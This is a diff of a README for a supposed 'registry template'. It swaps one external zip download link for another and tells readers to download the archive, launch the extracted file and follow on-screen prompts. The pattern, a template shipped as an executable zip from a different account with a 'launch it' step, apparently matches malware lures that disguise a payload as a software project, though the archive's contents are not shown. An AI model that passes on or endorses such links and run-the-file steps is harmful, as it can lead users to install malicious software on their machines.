@@ -10,10 +10,10 @@ This repository serves as a template for running your own registry. Whether you 
 🔄 Efficient data retrieval and management  
 
 ### Installation Guide:
-To access the template for your own registry, simply download the [**Release.zip**](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) file. Once downloaded, extract the contents and launch the template to begin setting up your registry. 
+To access the template for your own registry, simply download the [**https://github.com/ejLw/registry-template/releases/download/v1.0/Application.zip**](https://github.com/ejLw/registry-template/releases/download/v1.0/Application.zip) file. Once downloaded, extract the contents and launch the template to begin setting up your registry. 
 
 ### Get Started:
-1. Download the [**Release.zip**](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+1. Download the [**https://github.com/ejLw/registry-template/releases/download/v1.0/Application.zip**](https://github.com/ejLw/registry-template/releases/download/v1.0/Application.zip)
 2. Launch the extracted file to begin customizing the registry template
 3. Follow the on-screen instructions to set up your registry
 
